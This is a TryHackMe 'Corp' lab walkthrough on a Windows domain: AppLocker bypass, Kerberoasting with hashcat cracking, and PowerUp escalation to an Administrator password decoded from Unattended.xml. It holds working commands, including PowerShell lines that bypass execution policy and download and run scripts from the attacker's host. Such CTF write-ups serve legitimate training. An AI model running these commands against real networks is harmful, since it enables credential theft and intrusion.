# Corp - TryHackMe Writeup

**OS:** Windows (Domain)  
**Difficulty:** Medium  
**Topics:** AppLocker bypass, Kerberoasting, PowerUp enumeration, unattended installation credential exposure

---

## Summary

Connect via RDP with provided domain credentials. Bypass AppLocker using a default-whitelisted path, Kerberoast a domain account and crack the TGS offline, then escalate using credentials leaked in `Unattended.xml` discovered by PowerUp.

---

## 1. Connection

Credentials are in the room **Credentials** section. Replace `<TARGET_IP>` with the machine IP from TryHackMe.

```bash
xfreerdp /u:corp\\dark /p:'<PASSWORD_FROM_ROOM>' /v:<TARGET_IP> /dynamic-resolution +clipboard
```

The room also offers in-browser RDP; a local client often behaves better for copying commands.

---

## 2. AppLocker Bypass

AppLocker may block the Start menu, many shortcuts, and PowerShell launched from non-whitelisted locations. A common default **DLL / executable rule exception** path is:

```text
C:\Windows\System32\spool\drivers\color
```

**Open PowerShell from an allowed context:**

- Open **File Explorer** (often still works).
- In the **address bar** (where the current path is shown), type `powershell` and press Enter — Explorer may spawn PowerShell in a way that is permitted.

Alternatively navigate to the path above in the address bar, then use **Open PowerShell window here** if the context menu is available.

To confirm policy behavior (optional):

```powershell
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

---

## 3. Kerberoasting

### Host the script on Kali

Use your **VPN** address (`ip a` → `tun0`), not the lab-only address.

```bash
cd ~/Desktop
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
python3 -m http.server 80
```

Verify from Kali:

```bash
curl -sI http://<KALI_TUN0_IP>/Invoke-Kerberoast.ps1
```

### Run on Windows

Use **HTTP** if you serve with Python’s simple server (not HTTPS unless you set TLS).

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_TUN0_IP>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash"
```

Save the printed `$krb5tgs$23$...` line to `hash.txt` on Kali (single line).

### Crack offline (Hashcat)

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Use the cracked password to authenticate as the roasted account (e.g. `corp\fela`) via RDP or `runas` / further enumeration.

**Optional SPN enumeration** (domain name from the machine, often `corp`):

```cmd
setspn -T corp -Q */*
```

---

## 4. Privilege Escalation — PowerUp

Host **PowerUp.ps1** the same way as Invoke-Kerberoast.

```bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python3 -m http.server 80
```

As the compromised domain user:

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_TUN0_IP>/PowerUp.ps1'); Invoke-AllChecks"
```

Typical useful findings in this room:

- User in a group that can administer the machine → **BypassUAC** may be listed.
- **UnattendedPath** pointing to something like `C:\Windows\Panther\Unattend\Unattended.xml`.

This walkthrough follows the **UnattendedPath** path from the room instructions.

---

## 5. Unattended.xml — Administrator Credentials

```powershell
type C:\Windows\Panther\Unattend\Unattended.xml
```

Look for a `<Value>` element containing **Base64**. Decode on Kali:

```bash
echo '<BASE64_STRING>' | base64 -d
```

The decoded value is the **local Administrator** password for this lab.

---

## 6. Access as Administrator

```bash
xfreerdp /u:Administrator /p:'<DECODED_PASSWORD>' /v:<TARGET_IP> /dynamic-resolution +clipboard
```

Retrieve the user flag and root/admin flag from the locations described in the room (commonly `Desktop` or paths hinted in the tasks).

---

## Lessons Learned

- **AppLocker** often still allows execution from known exceptions such as `spool\drivers\color`; understanding default rules matters as much as “exotic” bypasses.
- **Kerberoasting** turns weak service account passwords into domain lateral movement — always enforce long random passwords for SPN-backed accounts.
- **Unattended.xml** and other unattended setup files frequently contain encoded or cleartext secrets; treat gold images and deployment shares as sensitive.
- **PowerUp** (`Invoke-AllChecks`) gives a fast, structured Windows privilege escalation checklist when you already have PowerShell.

---

## References

- [Microsoft — Unattended Windows Setup](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461)
- Invoke-Kerberoast (Empire module source)
- PowerUp (PowerShellEmpire PowerTools)
